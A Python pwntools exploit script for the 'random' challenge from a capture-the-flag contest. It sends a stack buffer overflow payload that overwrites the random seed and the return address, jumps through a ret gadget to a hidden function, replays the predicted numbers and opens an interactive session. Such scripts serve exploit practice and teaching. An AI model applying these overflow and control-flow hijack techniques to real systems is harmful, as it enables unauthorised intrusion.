#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('random')

"""
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
"""

host = args.HOST or 'cybergon2023.webhop.me'
port = int(args.PORT or 5003)
#  context.log_level = "DEBUG"

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break main
break *0x401402
continue
'''.format(**locals())


SEED_OFFSET = cyclic_find(0x62616164)
POTATO_ADDRESS = 0x4011b6
RET_GADGET = 0x401402
RET_OFFSET = cyclic_find(0x61616166)

def do_exploit():
    io = start()
    print(SEED_OFFSET)
    payload = b"."*SEED_OFFSET + p32(1) # seed random with 1
    payload += b"A"*RET_OFFSET
    payload += p64(RET_GADGET) # fix movaps alignment
    payload += p64(POTATO_ADDRESS)
    io.sendline(payload)

    # gdb: break *(main+334)
    # input:  x/10x 0x4040e0
    # rand:   x/10x 0x4040a0
    numbers = [
        0x68, 0xc7, 0x6a, 0x74, 0x52,
        0x00, 0x4b, 0xed, 0x2a, 0xce
    ]
    for i in numbers:
        io.sendline(str(i).encode())

    io.interactive()

do_exploit()
